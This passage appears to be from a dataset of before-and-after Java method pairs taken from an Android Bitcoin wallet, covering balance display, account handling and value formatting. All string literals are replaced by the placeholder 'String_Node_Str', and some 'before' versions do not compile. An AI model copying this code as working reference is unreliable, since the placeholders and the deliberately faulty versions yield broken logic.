  WindowManager windowManager=(WindowManager)_applicationContext.getSystemService(Context.WINDOW_SERVICE);
  windowManager.getDefaultDisplay().getMetrics(dm);
  _storage=new MetadataStorage(_applicationContext);
  _language=preferences.getString(Constants.LANGUAGE_SETTING,Locale.getDefault().getLanguage());
  _versionManager=new VersionManager(_applicationContext,_language,new AndroidAsyncApi(_wapi,_eventBus),version,_eventBus);
  Set<String> currencyList=getPreferences().getStringSet(Constants.SELECTED_CURRENCIES,null);
  Set<String> fiatCurrencies=new HashSet<>();
  if (currencyList == null || currencyList.isEmpty()) {
    fiatCurrencies.add(Constants.DEFAULT_CURRENCY);
  }
 else {
    fiatCurrencies.addAll(currencyList);
  }
  _exchangeRateManager=new ExchangeRateManager(_applicationContext,_wapi,getNetwork(),getMetadataStorage());
  _currencySwitcher=new CurrencySwitcher(_exchangeRateManager,fiatCurrencies,getPreferences().getString(Constants.FIAT_CURRENCY_SETTING,Constants.DEFAULT_CURRENCY),Denomination.fromString(preferences.getString(Constants.BITCOIN_DENOMINATION_SETTING,Denomination.BTC.toString())));
  ActivityManager am=(ActivityManager)_applicationContext.getSystemService(Context.ACTIVITY_SERVICE);
  int memoryClass=am.getMemoryClass();
  _deviceScryptParameters=memoryClass > 20 ? MrdExport.V1.ScryptParameters.DEFAULT_PARAMS : MrdExport.V1.ScryptParameters.LOW_MEM_PARAMS;
  _trezorManager=new TrezorManager(_applicationContext,getNetwork(),getEventBus());
  _keepkeyManager=new KeepKeyManager(_applicationContext,getNetwork(),getEventBus());
  _ledgerManager=new LedgerManager(_applicationContext,getNetwork(),getEventBus());
  _walletManager=createWalletManager(_applicationContext,_environment);
  _eventTranslator=new EventTranslator(new Handler(),_eventBus);
  _exchangeRateManager.subscribe(_eventTranslator);
  _walletManager.addObserver(_eventTranslator);
  _coinapultManager=createCoinapultManager();
  if (_coinapultManager.isPresent()) {
    addExtraAccounts(_coinapultManager.get());
  }
  new InitColuManagerTask().execute();
  setCurrencyList(fiatCurrencies);
  migrateOldKeys();
  createTempWalletManager();
  _versionManager.initBackgroundVersionChecker();
  _blockExplorerManager=new BlockExplorerManager(this,_environment.getBlockExplorerList(),getPreferences().getString(Constants.BLOCK_EXPLORER,_environment.getBlockExplorerList().get(0).getIdentifier()));
}"
91086,"private void updateUiKnownBalance(CurrencyBasedBalance balance){
  String valueString=Utils.getFormattedValueWithUnit(balance.confirmed,_mbwManager.getBitcoinDenomination());
  WalletAccount account=Preconditions.checkNotNull(_mbwManager.getSelectedAccount());
  if (account instanceof ColuAccount) {
    valueString=Utils.getColuFormattedValueWithUnit(account.getCurrencyBasedBalance().confirmed);
  }
  ((TextView)_root.findViewById(R.id.tvBalance)).setText(valueString);
  _root.findViewById(R.id.pbProgress).setVisibility(balance.isSynchronizing ? View.VISIBLE : View.GONE);
  _tcdFiatDisplay.setFiatOnly(balance.confirmed.isBtc() || (account instanceof ColuAccount && ((ColuAccount)account).getColuAsset().assetType == ColuAccount.ColuAssetType.RMC));
  _tcdFiatDisplay.setValue(balance.confirmed);
  if (balance.receiving.getValue().compareTo(BigDecimal.ZERO) > 0) {
    String receivingString;
    if (account instanceof ColuAccount) {
      receivingString=Utils.getColuFormattedValueWithUnit(balance.receiving);
    }
 else {
      receivingString=Utils.getFormattedValueWithUnit(balance.receiving,_mbwManager.getBitcoinDenomination());
    }
    String receivingText=getResources().getString(R.string.receiving,receivingString);
    TextView tvReceiving=_root.findViewById(R.id.tvReceiving);
    tvReceiving.setText(receivingText);
    tvReceiving.setVisibility(View.VISIBLE);
  }
 else {
    _root.findViewById(R.id.tvReceiving).setVisibility(View.GONE);
  }
  setFiatValue(R.id.tvReceivingFiat,balance.receiving,true);
  if (balance.sending.getValue().compareTo(BigDecimal.ZERO) > 0) {
    String sendingString;
    if (account instanceof ColuAccount) {
      sendingString=Utils.getColuFormattedValueWithUnit(balance.sending);
    }
 else {
      sendingString=Utils.getFormattedValueWithUnit(balance.sending,_mbwManager.getBitcoinDenomination());
    }
    String sendingText=getResources().getString(R.string.sending,sendingString);
    TextView tvSending=_root.findViewById(R.id.tvSending);
    tvSending.setText(sendingText);
    tvSending.setVisibility(View.VISIBLE);
  }
 else {
    _root.findViewById(R.id.tvSending).setVisibility(View.GONE);
  }
  setFiatValue(R.id.tvSendingFiat,balance.sending,true);
}","private void updateUiKnownBalance(CurrencyBasedBalance balance){
  String valueString=Utils.getFormattedValueWithUnit(balance.confirmed,_mbwManager.getBitcoinDenomination());
  WalletAccount account=Preconditions.checkNotNull(_mbwManager.getSelectedAccount());
  if (account instanceof ColuAccount) {
    valueString=Utils.getColuFormattedValueWithUnit(account.getCurrencyBasedBalance().confirmed);
  }
  ((TextView)_root.findViewById(R.id.tvBalance)).setText(valueString);
  _root.findViewById(R.id.pbProgress).setVisibility(balance.isSynchronizing ? View.VISIBLE : View.GONE);
  _tcdFiatDisplay.setFiatOnly(true);
  _tcdFiatDisplay.setValue(balance.confirmed);
  if (balance.receiving.getValue().compareTo(BigDecimal.ZERO) > 0) {
    String receivingString;
    if (account instanceof ColuAccount) {
      receivingString=Utils.getColuFormattedValueWithUnit(balance.receiving);
    }
 else {
      receivingString=Utils.getFormattedValueWithUnit(balance.receiving,_mbwManager.getBitcoinDenomination());
    }
    String receivingText=getResources().getString(R.string.receiving,receivingString);
    TextView tvReceiving=_root.findViewById(R.id.tvReceiving);
    tvReceiving.setText(receivingText);
    tvReceiving.setVisibility(View.VISIBLE);
  }
 else {
    _root.findViewById(R.id.tvReceiving).setVisibility(View.GONE);
  }
  setFiatValue(R.id.tvReceivingFiat,balance.receiving,true);
  if (balance.sending.getValue().compareTo(BigDecimal.ZERO) > 0) {
    String sendingString;
    if (account instanceof ColuAccount) {
      sendingString=Utils.getColuFormattedValueWithUnit(balance.sending);
    }
 else {
      sendingString=Utils.getFormattedValueWithUnit(balance.sending,_mbwManager.getBitcoinDenomination());
    }
    String sendingText=getResources().getString(R.string.sending,sendingString);
    TextView tvSending=_root.findViewById(R.id.tvSending);
    tvSending.setText(sendingText);
    tvSending.setVisibility(View.VISIBLE);
  }
 else {
    _root.findViewById(R.id.tvSending).setVisibility(View.GONE);
  }
  setFiatValue(R.id.tvSendingFiat,balance.sending,true);
}"
91087,"public TotalViewHolder(View itemView){
  super(itemView);
  tcdBalance=(ToggleableCurrencyButton)itemView.findViewById(R.id.tcdBalance);
}","public TotalViewHolder(View itemView){
  super(itemView);
  tcdBalance=itemView.findViewById(R.id.tcdBalance);
}"
91088,"@Subscribe public void syncStopped(SyncStopped event){
  TextView tvRecv=(TextView)findViewById(R.id.tvReceived);
  TextView tvRecvWarning=(TextView)findViewById(R.id.tvReceivedWarningAmount);
  final WalletAccount selectedAccount=_mbwManager.getSelectedAccount();
  final List<TransactionSummary> transactionsSince=selectedAccount.getTransactionsSince(_receivingSince);
  final ArrayList<TransactionSummary> interesting=new ArrayList<TransactionSummary>();
  CurrencyValue sum=ExactBitcoinValue.ZERO;
  for (  TransactionSummary item : transactionsSince) {
    if (item.toAddresses.contains(_address)) {
      interesting.add(item);
      sum=item.value;
    }
  }
  if (interesting.size() > 0) {
    String formattedValue=accountDisplayStrategy.getFormattedValue(sum);
    tvRecv.setText(getString(R.string.incoming_payment,formattedValue));
    if (!CurrencyValue.isNullOrZero(_amount)) {
      tvRecvWarning.setVisibility(sum.equals(_amount) ? View.GONE : View.VISIBLE);
    }
 else {
      tvRecvWarning.setVisibility(View.GONE);
    }
    tvRecv.setVisibility(View.VISIBLE);
    if (!sum.equals(_lastAddressBalance)) {
      Uri soundUri=RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
      NotificationCompat.Builder mBuilder=new NotificationCompat.Builder(getApplicationContext()).setSmallIcon(R.drawable.ic_launcher).setSound(soundUri,AudioManager.STREAM_NOTIFICATION);
      notificationManager.notify(0,mBuilder.build());
      _lastAddressBalance=sum;
    }
  }
 else {
    tvRecv.setVisibility(View.GONE);
  }
}","@Subscribe public void syncStopped(SyncStopped event){
  TextView tvRecv=(TextView)findViewById(R.id.tvReceived);
  TextView tvRecvWarning=(TextView)findViewById(R.id.tvReceivedWarningAmount);
  final WalletAccount selectedAccount=_mbwManager.getSelectedAccount();
  final List<TransactionSummary> transactionsSince=selectedAccount.getTransactionsSince(_receivingSince);
  final ArrayList<TransactionSummary> interesting=new ArrayList<TransactionSummary>();
  CurrencyValue sum=ExactBitcoinValue.ZERO;
  for (  TransactionSummary item : transactionsSince) {
    if (item.toAddresses.contains(_address)) {
      interesting.add(item);
      sum=item.value;
    }
  }
  if (interesting.size() > 0) {
    String formattedValue=accountDisplayStrategy.getFormattedValue(sum);
    tvRecv.setText(getString(R.string.incoming_payment,formattedValue));
    if (!CurrencyValue.isNullOrZero(_amount)) {
      tvRecvWarning.setVisibility(sum.equals(_amount) ? View.GONE : View.VISIBLE);
    }
 else {
      tvRecvWarning.setVisibility(View.GONE);
    }
    tvRecv.setVisibility(View.VISIBLE);
    if (!sum.equals(_lastAddressBalance)) {
      Uri soundUri=RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
      NotificationManager notificationManager=(NotificationManager)this.getSystemService(Context.NOTIFICATION_SERVICE);
      NotificationCompat.Builder mBuilder=new NotificationCompat.Builder(getApplicationContext()).setSmallIcon(R.drawable.ic_launcher).setSound(soundUri,AudioManager.STREAM_NOTIFICATION);
      notificationManager.notify(0,mBuilder.build());
      _lastAddressBalance=sum;
    }
  }
 else {
    tvRecv.setVisibility(View.GONE);
  }
}"
91089,"public boolean removeUnusedBip44Account(Bip44Account account){
  if (account.hasHadActivity()) {
    return removedAccountIds;
  }
synchronized (_walletAccounts) {
    _bip44Accounts.remove(account);
    _walletAccounts.remove(account.getId());
    _backing.deleteBip44AccountContext(account.getId());
    removedAccountIds.add(last.getId());
    if (_btcToBchAccounts.containsKey(last.getId())) {
      _walletAccounts.remove(_btcToBchAccounts.get(last.getId()));
      removedAccountIds.add(_btcToBchAccounts.get(last.getId()));
      _btcToBchAccounts.remove(last.getId());
    }
    return removedAccountIds;
  }
}","public void removeUnusedBip44Account(Bip44Account account){
  if (account.hasHadActivity()) {
    return;
  }
synchronized (_walletAccounts) {
    _bip44Accounts.remove(account);
    _walletAccounts.remove(account.getId());
    _backing.deleteBip44AccountContext(account.getId());
    if (_btcToBchAccounts.containsKey(account.getId())) {
      _walletAccounts.remove(_btcToBchAccounts.get(account.getId()));
      _btcToBchAccounts.remove(account.getId());
    }
  }
}"
91090,"@Override public void onActivityResult(final int requestCode,final int resultCode,final Intent intent){
  ActivityCompat.invalidateOptionsMenu(getActivity());
  if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddCoinapultAccountActivity.RESULT_COINAPULT) {
    UUID accountId=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    CoinapultAccount account=(CoinapultAccount)_mbwManager.getWalletManager(false).getAccount(accountId);
    _mbwManager.setSelectedAccount(accountId);
    accountListAdapter.setFocusedAccount(account);
    updateIncludingMenus();
  }
 else   if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == Activity.RESULT_OK) {
    UUID accountid=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    WalletAccount account=_mbwManager.getWalletManager(false).getAccount(accountid);
    if (account.isActive()) {
      _mbwManager.setSelectedAccount(accountid);
    }
    accountListAdapter.setFocusedAccount(account);
    update();
    if (!(account instanceof ColuAccount)) {
      setNameForNewAccount(account);
    }
  }
 else   if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddAdvancedAccountActivity.RESULT_MSG) {
    new AlertDialog.Builder(getActivity()).setMessage(intent.getStringExtra(AddAccountActivity.RESULT_MSG)).setPositiveButton(R.string.button_ok,null).create().show();
  }
 else {
    super.onActivityResult(requestCode,resultCode,intent);
  }
}","@Override public void onActivityResult(final int requestCode,final int resultCode,final Intent intent){
  ActivityCompat.invalidateOptionsMenu(getActivity());
  if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddCoinapultAccountActivity.RESULT_COINAPULT) {
    UUID accountId=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    CoinapultAccount account=(CoinapultAccount)_mbwManager.getWalletManager(false).getAccount(accountId);
    _mbwManager.setSelectedAccount(accountId);
    accountListAdapter.setFocusedAccount(account);
    updateIncludingMenus();
  }
 else   if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == Activity.RESULT_OK) {
    UUID accountid=(UUID)intent.getSerializableExtra(AddAccountActivity.RESULT_KEY);
    WalletManager walletManager=_mbwManager.getWalletManager(false);
    WalletAccount account=walletManager.getAccount(accountid);
    if (account.isActive()) {
      _mbwManager.setSelectedAccount(accountid);
    }
    accountListAdapter.setFocusedAccount(account);
    updateIncludingMenus();
    if (!(account instanceof ColuAccount) && !intent.getBooleanExtra(AddAccountActivity.IS_UPGRADE,false)) {
      setNameForNewAccount(account);
    }
    _mbwManager.getEventBus().post(new ExtraAccountsChanged());
    _mbwManager.getEventBus().post(new AccountChanged(accountid));
  }
 else   if (requestCode == ADD_RECORD_RESULT_CODE && resultCode == AddAdvancedAccountActivity.RESULT_MSG) {
    new AlertDialog.Builder(getActivity()).setMessage(intent.getStringExtra(AddAccountActivity.RESULT_MSG)).setPositiveButton(R.string.button_ok,null).create().show();
  }
 else {
    super.onActivityResult(requestCode,resultCode,intent);
  }
}"
91091,"private CurrencySum getSpendableBalance(List<WalletAccount> walletAccountList){
  CurrencySum currencySum=new CurrencySum();
  for (  WalletAccount account : walletAccountList) {
    currencySum.add(account.getCurrencyBasedBalance().confirmed);
  }
  return currencySum;
}","private CurrencySum getSpendableBalance(List<WalletAccount> walletAccountList){
  CurrencySum currencySum=new CurrencySum();
  for (  WalletAccount account : walletAccountList) {
    if (!account.isArchived()) {
      currencySum.add(account.getCurrencyBasedBalance().confirmed);
    }
  }
  return currencySum;
}"
91092,"private void Denomination(int decimalPlaces,String asciiString,String unicodeString,BigDecimal oneUnitInSatoshis){
  _decimalPlaces=decimalPlaces;
  _asciiString=asciiString;
  _unicodeString=unicodeString;
  _oneUnitInSatoshis=oneUnitInSatoshis;
}","void Denomination(int decimalPlaces,String asciiString,String unicodeString,BigDecimal oneUnitInSatoshis){
  _decimalPlaces=decimalPlaces;
  _asciiString=asciiString;
  _unicodeString=unicodeString;
  _oneUnitInSatoshis=oneUnitInSatoshis;
}"
91093,"public static String valueString(long value,Denomination denomination,int precision){
  BigDecimal d=BigDecimal.valueOf(value);
  d=d.divide(denomination.getOneUnitInSatoshis());
  if (!formatCache.containsKey(precision)) {
    DecimalFormat coinFormat=(DecimalFormat)COIN_FORMAT.clone();
    coinFormat.setMaximumFractionDigits(precision);
    formatCache.put(precision,coinFormat);
  }
  return formatCache.get(precision).format(d);
}","/** 
 * Get the given value in satoshis as a string on the form ""10.12345"" using the specified denomination. <p> This method only returns necessary decimal points to tell the exact value. If you wish to display all digits use  {@link CoinUtil#fullValueString(long,Denomination)}
 * @param value The number of satoshis
 * @param denomination The denomination to use
 * @param precision max number of digits after the comma
 * @return The given value in satoshis as a string on the form ""10.12345"".
 */
public static String valueString(long value,Denomination denomination,int precision){
  BigDecimal d=BigDecimal.valueOf(value);
  d=d.divide(denomination.getOneUnitInSatoshis());
  if (!formatCache.containsKey(precision)) {
    DecimalFormat coinFormat=(DecimalFormat)COIN_FORMAT.clone();
    coinFormat.setMaximumFractionDigits(precision);
    formatCache.put(precision,coinFormat);
  }
  return formatCache.get(precision).format(d);
}"
91094,"public static Denomination fromString(String string){
  if (string == null) {
    return BTC;
  }
  if (string.equals(""String_Node_Str"")) {
    return BTC;
  }
 else   if (string.equals(""String_Node_Str"")) {
    return mBTC;
  }
 else   if (string.equals(""String_Node_Str"")) {
    return uBTC;
  }
 else   if (string.equals(""String_Node_Str"")) {
    return BITS;
  }
 else {
    return BTC;
  }
}","public static Denomination fromString(String string){
  if (string == null) {
    return BTC;
  }
switch (string) {
case ""String_Node_Str"":
    return BTC;
case ""String_Node_Str"":
  return mBTC;
case ""String_Node_Str"":
return uBTC;
case ""String_Node_Str"":
return BITS;
default :
return BTC;
}
}"
91095,"protected void shareByNfc(){
  NfcAdapter nfc=NfcAdapter.getDefaultAdapter(this);
  if (nfc != null && nfc.isNdefPushEnabled()) {
    nfc.setNdefPushMessageCallback(new NfcAdapter.CreateNdefMessageCallback(){
      @Override public NdefMessage createNdefMessage(      NfcEvent event){
        NdefRecord uriRecord=NdefRecord.createUri(getPaymentUri());
        return new NdefMessage(new NdefRecord[]{uriRecord});
      }
    }
,this);
    ivNfc.setVisibility(View.VISIBLE);
    ivNfc.setOnClickListener(new OnClickListener(){
      @Override public void onClick(      View v){
        Utils.showSimpleMessageDialog(ReceiveCoinsActivity.this,getString(R.string.nfc_payment_request_hint));
      }
    }
);
  }
 else {
    ivNfc.setVisibility(View.GONE);
  }
}","protected void shareByNfc(){
  NfcAdapter nfc=NfcAdapter.getDefaultAdapter(this);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN && nfc != null && nfc.isNdefPushEnabled()) {
    nfc.setNdefPushMessageCallback(new NfcAdapter.CreateNdefMessageCallback(){
      @Override public NdefMessage createNdefMessage(      NfcEvent event){
        NdefRecord uriRecord=NdefRecord.createUri(getPaymentUri());
        return new NdefMessage(new NdefRecord[]{uriRecord});
      }
    }
,this);
    ivNfc.setVisibility(View.VISIBLE);
    ivNfc.setOnClickListener(new OnClickListener(){
      @Override public void onClick(      View v){
        Utils.showSimpleMessageDialog(ReceiveCoinsActivity.this,getString(R.string.nfc_payment_request_hint));
      }
    }
);
  }
 else {
    ivNfc.setVisibility(View.GONE);
  }
}"
91096,"@OnClick(R.id.btEnterAmount) public void onEnterClick(){
  if (CurrencyValue.isNullOrZero(_amount)) {
    GetAmountActivity.callMe(ReceiveCoinsActivity.this,ExactCurrencyValue.from(null,_mbwManager.getSelectedAccount().getAccountDefaultCurrency()),GET_AMOUNT_RESULT_CODE);
  }
 else {
    GetAmountActivity.callMe(ReceiveCoinsActivity.this,_amount.getExactValueIfPossible(),GET_AMOUNT_RESULT_CODE);
  }
}","@OnClick(R.id.btEnterAmount) public void onEnterClick(){
  if (CurrencyValue.isNullOrZero(_amount)) {
    GetAmountActivity.callMeToReceive(this,ExactCurrencyValue.from(null,_mbwManager.getSelectedAccount().getAccountDefaultCurrency()),GET_AMOUNT_RESULT_CODE);
  }
 else {
    GetAmountActivity.callMeToReceive(this,_amount.getExactValueIfPossible(),GET_AMOUNT_RESULT_CODE);
  }
}"
91097,"@OnClick(R.id.btEnterAmount) void onClickAmount(){
  CurrencyValue presetAmount=_amountToSend;
  if (CurrencyValue.isNullOrZero(presetAmount)) {
    presetAmount=ExactCurrencyValue.from(null,_account.getAccountDefaultCurrency());
  }
  GetAmountActivity.callMe(this,GET_AMOUNT_RESULT_CODE,_account.getId(),presetAmount,feePerKbValue,_isColdStorage);
}","@OnClick(R.id.btEnterAmount) void onClickAmount(){
  CurrencyValue presetAmount=_amountToSend;
  if (CurrencyValue.isNullOrZero(presetAmount)) {
    presetAmount=ExactCurrencyValue.from(null,_account.getAccountDefaultCurrency());
  }
  GetAmountActivity.callMeToSend(this,GET_AMOUNT_RESULT_CODE,_account.getId(),presetAmount,feePerKbValue,_isColdStorage);
}"
91098,"public static List<WalletAccount> sortAccounts(final List<WalletAccount> accounts,final MetadataStorage storage){
  Ordering<WalletAccount> type=Ordering.natural().onResultOf(new Function<WalletAccount,Integer>(){
    @Nullable @Override public Integer apply(    @Nullable WalletAccount input){
      if (input instanceof Bip44Account) {
        return 0;
      }
      if (input instanceof SingleAddressAccount) {
        return checkIsLinked(input,accounts) ? 3 : 1;
      }
      if (input instanceof ColuAccount) {
        return 3;
      }
      if (input instanceof CoinapultAccount) {
        return 4;
      }
      return 2;
    }
  }
);
  Ordering<WalletAccount> index=Ordering.natural().onResultOf(new Function<WalletAccount,Integer>(){
    @Nullable @Override public Integer apply(    @Nullable WalletAccount input){
      if (input instanceof Bip44Account) {
        Bip44Account bip44Account=(Bip44Account)input;
        return bip44Account.getAccountIndex();
      }
      return Integer.MAX_VALUE;
    }
  }
);
  Comparator<WalletAccount> linked=new Comparator<WalletAccount>(){
    @Override public int compare(    WalletAccount w1,    WalletAccount w2){
      if (w1 instanceof ColuAccount) {
        return ((ColuAccount)w1).getLinkedAccount().getId().equals(w2.getId()) ? -1 : 0;
      }
 else       if (w2 instanceof ColuAccount) {
        return ((ColuAccount)w2).getLinkedAccount().getId().equals(w1.getId()) ? 1 : 0;
      }
 else {
        return 0;
      }
    }
  }
;
  Ordering<WalletAccount> name=Ordering.natural().onResultOf(new Function<WalletAccount,String>(){
    @Nullable @Override public String apply(    @Nullable WalletAccount input){
      return storage.getLabelByAccount(input.getId());
    }
  }
);
  return type.compound(index).compound(linked).compound(name).sortedCopy(accounts);
}","public static List<WalletAccount> sortAccounts(final List<WalletAccount> accounts,final MetadataStorage storage){
  Ordering<WalletAccount> type=Ordering.natural().onResultOf(new Function<WalletAccount,Integer>(){
    @Override public Integer apply(    @Nullable WalletAccount input){
      if (input instanceof Bip44Account) {
        return 0;
      }
      if (input instanceof SingleAddressAccount) {
        return checkIsLinked(input,accounts) ? 3 : 1;
      }
      if (input instanceof ColuAccount) {
        return 3;
      }
      if (input instanceof CoinapultAccount) {
        return 4;
      }
      return 2;
    }
  }
);
  Ordering<WalletAccount> index=Ordering.natural().onResultOf(new Function<WalletAccount,Integer>(){
    @Nullable @Override public Integer apply(    @Nullable WalletAccount input){
      if (input instanceof Bip44Account) {
        Bip44Account bip44Account=(Bip44Account)input;
        return bip44Account.getAccountIndex();
      }
      return Integer.MAX_VALUE;
    }
  }
);
  Comparator<WalletAccount> linked=new Comparator<WalletAccount>(){
    @Override public int compare(    WalletAccount w1,    WalletAccount w2){
      if (w1 instanceof ColuAccount) {
        return ((ColuAccount)w1).getLinkedAccount().getId().equals(w2.getId()) ? -1 : 0;
      }
 else       if (w2 instanceof ColuAccount) {
        return ((ColuAccount)w2).getLinkedAccount().getId().equals(w1.getId()) ? 1 : 0;
      }
 else {
        return 0;
      }
    }
  }
;
  Ordering<WalletAccount> name=Ordering.natural().onResultOf(new Function<WalletAccount,String>(){
    @Nullable @Override public String apply(    @Nullable WalletAccount input){
      return storage.getLabelByAccount(input.getId());
    }
  }
);
  return type.compound(index).compound(linked).compound(name).sortedCopy(accounts);
}"
91099,"public static String getFormattedValue(CurrencyValue value,CoinUtil.Denomination denomination,int precision){
  if (value == null) {
    return ""String_Node_Str"";
  }
  BigDecimal val=value.getValue();
  if (val == null) {
    return ""String_Node_Str"";
  }
  if (value.isBtc()) {
    return CoinUtil.valueString(((BitcoinValue)value).getLongValue(),denomination,precision);
  }
 else {
    if (!formatCache.containsKey(precision)) {
      DecimalFormat fiatFormat=(DecimalFormat)FIAT_FORMAT.clone();
      fiatFormat.setMaximumFractionDigits(precision);
      formatCache.put(precision,fiatFormat);
    }
    return formatCache.get(precision).format(val);
  }
}","public static String getFormattedValue(CurrencyValue value,CoinUtil.Denomination denomination,int precision){
  if (value == null) {
    return ""String_Node_Str"";
  }
  BigDecimal val=value.getValue();
  if (val == null) {
    return ""String_Node_Str"";
  }
  if (value.isBtc()) {
    return CoinUtil.valueString(((BitcoinValue)value).getLongValue(),denomination,precision);
  }
 else {
    if (formatCache.get(precision) == null) {
      DecimalFormat fiatFormat=(DecimalFormat)FIAT_FORMAT.clone();
      fiatFormat.setMaximumFractionDigits(precision);
      formatCache.put(precision,fiatFormat);
    }
    return formatCache.get(precision).format(val);
  }
}"
91100,"public static Bitmap getMinimalQRCodeBitmap(String url){
  Hashtable<EncodeHintType,Object> hints=new Hashtable<EncodeHintType,Object>();
  hints.put(EncodeHintType.ERROR_CORRECTION,ErrorCorrectionLevel.M);
  hints.put(EncodeHintType.MARGIN,5);
  try {
    final BitMatrix result=new QRCodeWriter().encode(url,BarcodeFormat.QR_CODE,0,0,hints);
    final int width=result.getWidth();
    final int height=result.getHeight();
    final int[] pixels=new int[width * height];
    for (int y=0; y < height; y++) {
      final int offset=y * width;
      for (int x=0; x < width; x++) {
        pixels[offset + x]=result.get(x,y) ? Color.BLACK : Color.WHITE;
      }
    }
    final Bitmap smallBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);
    smallBitmap.setPixels(pixels,0,width,0,0,width,height);
    return smallBitmap;
  }
 catch (  final WriterException x) {
    x.printStackTrace();
    return null;
  }
}","public static Bitmap getMinimalQRCodeBitmap(String url){
  Hashtable<EncodeHintType,Object> hints=new Hashtable<>();
  hints.put(EncodeHintType.ERROR_CORRECTION,ErrorCorrectionLevel.M);
  hints.put(EncodeHintType.MARGIN,5);
  try {
    final BitMatrix result=new QRCodeWriter().encode(url,BarcodeFormat.QR_CODE,0,0,hints);
    final int width=result.getWidth();
    final int height=result.getHeight();
    final int[] pixels=new int[width * height];
    for (int y=0; y < height; y++) {
      final int offset=y * width;
      for (int x=0; x < width; x++) {
        pixels[offset + x]=result.get(x,y) ? Color.BLACK : Color.WHITE;
      }
    }
    final Bitmap smallBitmap=Bitmap.createBitmap(width,height,Bitmap.Config.ARGB_8888);
    smallBitmap.setPixels(pixels,0,width,0,0,width,height);
    return smallBitmap;
  }
 catch (  final WriterException x) {
    x.printStackTrace();
    return null;
  }
}"
91101,"public static String getFiatValueAsString(long satoshis,Double oneBtcInFiat,int precision){
  Double converted=getFiatValue(satoshis,oneBtcInFiat);
  if (converted == null) {
    return null;
  }
  if (!formatCache.containsKey(precision)) {
    DecimalFormat fiatFormat=(DecimalFormat)FIAT_FORMAT.clone();
    fiatFormat.setMaximumFractionDigits(precision);
    formatCache.put(precision,fiatFormat);
  }
  return formatCache.get(precision).format(converted);
}","public static String getFiatValueAsString(long satoshis,Double oneBtcInFiat,int precision){
  Double converted=getFiatValue(satoshis,oneBtcInFiat);
  if (converted == null) {
    return null;
  }
  if (formatCache.get(precision) == null) {
    DecimalFormat fiatFormat=(DecimalFormat)FIAT_FORMAT.clone();
    fiatFormat.setMaximumFractionDigits(precision);
    formatCache.put(precision,fiatFormat);
  }
  return formatCache.get(precision).format(converted);
}"
91102,"public static String getFormattedValueWithUnit(CurrencyValue value,CoinUtil.Denomination denomination,int precision){
  if (value == null) {
    return ""String_Node_Str"";
  }
  BigDecimal val=value.getValue();
  if (val == null) {
    return ""String_Node_Str"";
  }
  if (value.isBtc()) {
    return String.format(""String_Node_Str"",CoinUtil.valueString(((BitcoinValue)value).getLongValue(),denomination,precision),denomination.getUnicodeName());
  }
 else {
    if (!formatCache.containsKey(precision)) {
      DecimalFormat fiatFormat=(DecimalFormat)FIAT_FORMAT.clone();
      fiatFormat.setMaximumFractionDigits(precision);
      formatCache.put(precision,fiatFormat);
    }
    return String.format(""String_Node_Str"",formatCache.get(precision).format(val),value.getCurrency());
  }
}","public static String getFormattedValueWithUnit(CurrencyValue value,CoinUtil.Denomination denomination,int precision){
  if (value == null) {
    return ""String_Node_Str"";
  }
  BigDecimal val=value.getValue();
  if (val == null) {
    return ""String_Node_Str"";
  }
  if (value.isBtc()) {
    return String.format(""String_Node_Str"",CoinUtil.valueString(((BitcoinValue)value).getLongValue(),denomination,precision),denomination.getUnicodeName());
  }
 else {
    if (formatCache.get(precision) == null) {
      DecimalFormat fiatFormat=(DecimalFormat)FIAT_FORMAT.clone();
      fiatFormat.setMaximumFractionDigits(precision);
      formatCache.put(precision,fiatFormat);
    }
    return String.format(""String_Node_Str"",formatCache.get(precision).format(val),value.getCurrency());
  }
}"
91103,"/** 
 * Show an optional message/ <p> The user can check a ""never show this again"" check box and the message will never get displayed again.
 * @param context           The context
 * @param messageResourceId The resource ID of the message to show
 * @param onOkay            This runnable gets executed either if the user clicks Okay or if he choose to never-see-this-message-again
 */
public static boolean showOptionalMessage(final Context context,int messageResourceId,final Runnable onOkay){
  String message=context.getString(messageResourceId);
  final String optionalMessageId=Integer.toString(message.hashCode());
  SharedPreferences settings=context.getSharedPreferences(""String_Node_Str"",Activity.MODE_PRIVATE);
  boolean ignore=settings.getBoolean(optionalMessageId,false);
  if (ignore) {
    if (onOkay != null) {
      onOkay.run();
    }
    return false;
  }
  LayoutInflater inflater=(LayoutInflater)context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
  final View layout=inflater.inflate(R.layout.optional_message_dialog,null);
  AlertDialog.Builder builder=new AlertDialog.Builder(context).setView(layout);
  final AlertDialog dialog=builder.create();
  TextView tvMessage=((TextView)layout.findViewById(R.id.tvMessage));
  tvMessage.setText(message);
  CheckBox cb=(CheckBox)layout.findViewById(R.id.checkbox);
  cb.setOnCheckedChangeListener(new OnCheckedChangeListener(){
    @Override public void onCheckedChanged(    CompoundButton buttonView,    boolean isChecked){
      context.getSharedPreferences(""String_Node_Str"",Activity.MODE_PRIVATE).edit().putBoolean(optionalMessageId,isChecked).apply();
    }
  }
);
  layout.findViewById(R.id.btOk).setOnClickListener(new OnClickListener(){
    @Override public void onClick(    View v){
      if (onOkay != null) {
        onOkay.run();
      }
      dialog.dismiss();
    }
  }
);
  dialog.show();
  return true;
}","/** 
 * Show an optional message/ <p> The user can check a ""never show this again"" check box and the message will never get displayed again.
 * @param context           The context
 * @param messageResourceId The resource ID of the message to show
 * @param onOkay            This runnable gets executed either if the user clicks Okay or if he choose to never-see-this-message-again
 */
public static boolean showOptionalMessage(final Context context,int messageResourceId,final Runnable onOkay){
  String message=context.getString(messageResourceId);
  final String optionalMessageId=Integer.toString(message.hashCode());
  SharedPreferences settings=context.getSharedPreferences(""String_Node_Str"",Activity.MODE_PRIVATE);
  boolean ignore=settings.getBoolean(optionalMessageId,false);
  if (ignore) {
    if (onOkay != null) {
      onOkay.run();
    }
    return false;
  }
